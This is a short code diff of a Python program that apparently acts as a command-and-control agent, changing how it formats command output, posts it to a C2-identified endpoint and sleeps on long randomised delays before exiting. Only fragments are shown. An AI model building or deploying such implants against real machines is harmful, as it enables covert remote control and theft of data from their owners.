@@ -80,7 +80,7 @@ def handle(data):
 	else:
 		stdout = f"Invalid command: {data}"
 
-	output = f"Command: {command} {parameters}\n{stdout}"
+	output = f"{command}::{parameters}::{stdout}"
 	send_data(output)
 
 
@@ -120,7 +120,8 @@ def send_data(data):
 	Returns:
 
 	"""
-	status = make_post("data", data)
+	global c2_id
+	status = make_post(f"{c2_id}/data", data)
 	return status
 
 
@@ -313,6 +314,7 @@ def delay_for_mode(mode):
 		delay = random.randrange(21600, 64800)
 	print(f"Delaying for {delay}s...")
 	time.sleep(delay)
+	exit(0)
 
 
 if __name__ == "__main__":
